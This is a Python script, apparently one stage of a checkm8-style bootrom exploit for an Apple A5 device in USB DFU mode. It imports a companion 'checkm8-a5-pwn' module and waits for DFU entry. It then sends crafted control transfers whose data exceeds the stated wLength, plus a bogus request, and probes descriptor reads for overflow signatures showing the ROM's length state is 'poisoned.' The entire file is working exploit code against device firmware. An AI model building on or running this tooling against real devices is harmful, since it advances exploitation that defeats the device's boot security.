#!/usr/bin/env python3
"""State-poison harvest: install the A5 stage-2 length-state via
COMPLETE transactions only, then probe for the over-serving signature.

No kernel module. No cancels. No storms. Pure usbfs/libusb:
  baseline read (GET_DESCRIPTOR device, wLength 8)
  -> install attempts (the sketch's own overshoot DNLOAD shapes:
     wLength 0x40 / data 0x80, and wLength 0x2C0 / data 0x300,
     plus the set_global_state 0x40/0x40 pair class)
  -> after EACH install: probe read with wLength 8 and wLength 2.
     The POISON signature: any EOVERFLOW (-75/errno 75), any ret>probe
     length, or abnormal completion = the ROM's length state now
     driven by complete transactions = stage-2 machinery LIVE.
Waits for the user's fresh DFU dance entry first.
"""
import ctypes
import fcntl
import glob
import importlib.util
import os
import time

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "dayone", os.path.join(HERE, "checkm8-a5-pwn.py"))
d = importlib.util.module_from_spec(spec)
spec.loader.exec_module(d)


def dfu_present():
    for p in glob.glob("/sys/bus/usb/devices/*/idProduct"):
        try:
            if open(p).read().strip() == "1227":
                return True
        except OSError:
            pass
    return False


def wait_dance(timeout=2400):
    if dfu_present():
        print("stale attached - power-hold + dance NOW", flush=True)
        while dfu_present():
            time.sleep(0.1)
        print("gone - dance now", flush=True)
        t0 = time.time()
        while time.time() - t0 < timeout:
            if dfu_present():
                return True
            time.sleep(0.05)
        return False
    t0 = time.time()
    while time.time() - t0 < timeout:
        if dfu_present():
            return True
        time.sleep(0.05)
    return False


def probe(usb, handle, wl, name):
    """GET_DESCRIPTOR device with a short wLength; the poison signature."""
    try:
        rc, info = usb.raw_ctrl(handle, 0x80, 6, 0x0100, 0, wl, b'',
                                abandon=False, timeout_ms=500, name=name)
        status, actual = info[0], info[1]
        mark = ""
        if status == 6:  # OVERFLOW
            mark = "  <<< EOVERFLOW: POISON SIGNATURE"
        elif status == 0 and actual > wl:
            mark = "  <<< OVERSERVE: %d > wLength %d" % (actual, wl)
        print("probe %-8s wLength=%-3d: %s actual=%d %dus%s"
              % (name, wl, d.STATUS_NAMES[status], actual, int(info[3]),
                 mark), flush=True)
        return mark != ""
    except SystemExit as e:
        print("probe %-8s wLength=%-3d: HANG (%s)" % (name, wl, e),
              flush=True)
        return False


INSTALLS = [
    ('dnload-w40-d80', 0x21, 1, 0, 0, 0x40, b'L' * 0x80),
    ('dnload-w2C0-d300', 0x21, 1, 0, 0, 0x2C0, b'M' * 0x300),
    ('dnload-w40-d40', 0x21, 1, 0, 0, 0x40, b'K' * 0x40),
    ('bogus-0x00-w40-d64', 0x00, 0, 0, 0, 0x40, b'D' * 64),
    ('dfu-dnload0', 0x21, 1, 0, 0, 0, b''),
    ('dfu-getstatus', 0xA1, 3, 0, 0, 6, b''),
]


def main():
    if not wait_dance():
        print("no entry", flush=True)
        return 1
    print("DFU in - settling", flush=True)
    time.sleep(1.2)
    usb = d.LibUSB()
    dev, handle, desc, _ = d.acquire(usb, want_serial=False)

    poisoned = False
    rounds = 0
    for name, r, b, w, i, l, data in INSTALLS:
        rounds += 1
        try:
            rc, info = usb.raw_ctrl(handle, r, b, w, i, l, data,
                                    abandon=False, timeout_ms=600,
                                    name=name)
            print("install %-18s: %-9s actual=%-4d %dus"
                  % (name, d.STATUS_NAMES[info[0]], info[1], int(info[3])),
                  flush=True)
        except SystemExit as e:
            print("install %-18s: HANG" % name, flush=True)
            try:
                usb.release(handle)
            except Exception:
                pass
            time.sleep(0.9)
            try:
                dev, handle, desc, _ = d.acquire(usb, want_serial=False)
            except Exception:
                print("reacquire failed - stop", flush=True)
                return 1
        time.sleep(0.15)
        if probe(usb, handle, 8, "p8-r%d" % rounds):
            poisoned = True
        if probe(usb, handle, 2, "p2-r%d" % rounds):
            poisoned = True
        time.sleep(0.35)

    # final comprehensive readback
    print("--- final reads ---", flush=True)
    probe(usb, handle, 8, "final-p8")
    probe(usb, handle, 18, "final-p18")
    try:
        rc, info = usb.raw_ctrl(handle, 0x80, 6, 0x0303, 0x0409, 0xB6, b'',
                                abandon=False, timeout_ms=500, name='string3')
        txt_ok = info[0] == 0 and info[1] > 100
        print("final string3: %s actual=%d %s"
              % (d.STATUS_NAMES[info[0]], info[1],
                 "serves" if txt_ok else ""), flush=True)
    except SystemExit:
        print("final string3: HANG", flush=True)
    print("POISONED=%s" % poisoned, flush=True)
    return 0


if __name__ == "__main__":
    main()
